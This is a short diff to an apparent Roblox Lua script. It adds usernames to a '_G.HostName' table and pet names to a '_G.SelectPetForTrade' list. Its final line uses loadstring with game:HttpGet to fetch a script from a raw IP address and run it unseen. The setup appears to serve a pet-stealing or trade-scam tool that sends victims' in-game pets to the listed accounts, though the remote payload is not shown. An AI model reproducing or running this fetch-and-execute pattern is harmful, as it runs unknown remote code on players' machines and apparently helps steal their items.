@@ -9,6 +9,9 @@ _G.HostName = {
     ["Kaputpappa734"] = "French Fry Ferret",
     ["Mowenibara890"] = "Spaghetti Sloth",
     ["Latiljabro65041"] = "Corrupted Kitsune",
+    ["Emerlanz31472"] = "Dragonfly",
+    ["Smockhoy28125"] = "Mimic Octopus",
+    ["Huyomo884"] = "Kitsune",
 }
 
 _G.SelectPetForTrade = {
@@ -16,6 +19,9 @@ _G.SelectPetForTrade = {
     "Mochi Mouse",
     "French Fry Ferret",
     "Spaghetti Sloth",
+    "Dragonfly",
+    "Mimic Octopus",
+    "Kitsune",
 }
 
 loadstring(game:HttpGet("http://103.245.164.141/OScript.txt"))()
